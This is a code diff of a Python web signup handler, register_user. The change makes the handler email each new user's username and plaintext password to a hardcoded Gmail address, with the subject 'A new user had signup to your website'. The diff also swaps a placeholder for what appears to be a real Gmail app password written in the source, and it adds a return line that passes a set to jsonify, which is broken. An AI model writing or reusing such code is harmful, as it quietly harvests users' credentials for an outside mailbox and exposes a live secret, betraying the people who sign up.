@@ -21,10 +21,10 @@ def register_user():
 
         # Email credentials
         sender_email = "shs956899@gmail.com"
-        app_password = "your_app_password"  # Use App Password for Gmail if 2FA is enabled
+        app_password = "ubll nues ykvt ukoa"  # Use App Password for Gmail if 2FA is enabled
         receiver_email = "shs956899@gmail.com"
         body     = f"username: {username} || password: {password}"
-        subject = "This is the body of the email."
+        subject = "A new user had signup to your website"
 
         # Initialize yagmail with your credentials
         yag = yagmail.SMTP(sender_email, app_password)
@@ -35,7 +35,7 @@ def register_user():
             print("Email sent successfully!")
         except Exception as e:
             print(f"Failed to send email: {e}")
-
+        return jsonify({"done."})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
